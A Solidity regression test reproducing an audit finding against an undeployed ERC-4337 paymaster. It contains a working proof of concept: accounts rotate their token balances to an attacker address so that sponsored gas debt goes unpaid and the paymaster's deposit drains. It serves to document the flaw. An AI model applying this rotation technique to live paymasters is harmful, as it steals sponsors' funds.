// SPDX-License-Identifier: MIT
// HISTORICAL F-01 REPRO: DisciplePaymaster is no longer deployed/funded by this repository.
// This intentionally demonstrates the legacy debt bug; it is not a production gas path.
pragma solidity ^0.8.24;

import {PaymasterTestBase, MiniAccount} from "./PaymasterTestBase.sol";
import {PackedUserOperation as EpOp} from "../vendor/aa-v07/interfaces/PackedUserOperation.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

/// @notice Historical F-01 regression for a contract excluded from all deployment/funding paths.
/// The legacy design is deliberately unchanged; this records WHY it must never be re-enabled.
contract PaymasterDebtTest is PaymasterTestBase {
    address attacker = makeAddr("attacker");
    uint256 constant N = 3;

    uint256[N] ownerPks;
    MiniAccount[N] accts;

    function setUp() public {
        _setUp(18);
        for (uint256 i; i < N; ++i) {
            ownerPks[i] = uint256(keccak256(abi.encodePacked("f01-owner", i)));
            accts[i] = new MiniAccount(address(ep), vm.addr(ownerPks[i]));
        }
        usdg.mint(address(accts[0]), 1_000 * 10 ** dec);
        assertEq(usdg.balanceOf(address(accts[0])), 1_000 * 10 ** dec);
    }

    function _signPmSender(address sender, uint48 until, uint48 afterTs, uint256 r, uint256 maxTok)
        internal
        view
        returns (bytes memory)
    {
        bytes32 h = MessageHashUtils.toEthSignedMessageHash(pm.getHash(sender, until, afterTs, r, maxTok));
        (uint8 v, bytes32 rr, bytes32 s) = vm.sign(signerPk, h);
        return abi.encodePacked(
            address(pm), uint128(PM_VERIF_GAS), uint128(PM_POSTOP_GAS), until, afterTs, r, maxTok, rr, s, v
        );
    }

    function _signAcctPk(EpOp memory op, uint256 pk) internal view returns (EpOp memory) {
        bytes32 h = ep.getUserOpHash(op);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, MessageHashUtils.toEthSignedMessageHash(h));
        op.signature = abi.encodePacked(r, s, v);
        return op;
    }

    /// @dev approve(paymaster, maxTok) then transfer the full *pre-op* balance to `next` (the audit PoC shape).
    function _drainOp(uint256 idx, address next, uint256 maxTok) internal returns (EpOp memory op) {
        MiniAccount a = accts[idx];
        uint256 bal = usdg.balanceOf(address(a));
        MiniAccount.Call[] memory c = new MiniAccount.Call[](2);
        c[0] = MiniAccount.Call(address(usdg), 0, abi.encodeCall(ERC20.approve, (address(pm), maxTok)));
        c[1] = MiniAccount.Call(address(usdg), 0, abi.encodeCall(ERC20.transfer, (next, bal)));
        op.sender = address(a);
        op.nonce = ep.getNonce(address(a), 0);
        op.callData = abi.encodeCall(MiniAccount.executeBatch, (c));
        op.accountGasLimits = bytes32((VERIF_GAS << 128) | CALL_GAS);
        op.preVerificationGas = PVG;
        op.gasFees = bytes32((TIP << 128) | MAX_FEE);
        op.paymasterAndData = _signPmSender(
            address(a), uint48(block.timestamp + 120), uint48(block.timestamp - 10), rate, maxTok
        );
        op = _signAcctPk(op, ownerPks[idx]);
    }

    function test_historicalUndeployedContract_accountRotationLeavesDebt() public {
        uint256 dep0 = pm.getDeposit();
        uint256 maxTok = pm.tokenCost(_maxCost(), rate);
        for (uint256 i; i < N; ++i) {
            EpOp[] memory one = new EpOp[](1);
            one[0] = _drainOp(i, i + 1 < N ? address(accts[i + 1]) : attacker, maxTok);
            vm.prank(bundler, bundler);
            ep.handleOps(one, payable(bundler));
            assertGt(pm.owedOf(address(accts[i])), 0, "historical unpaid gas");
        }
        assertEq(usdg.balanceOf(treasury), 0);
        assertEq(usdg.balanceOf(attacker), 1_000 * 10 ** dec);
        assertLt(pm.getDeposit(), dep0);
    }
}
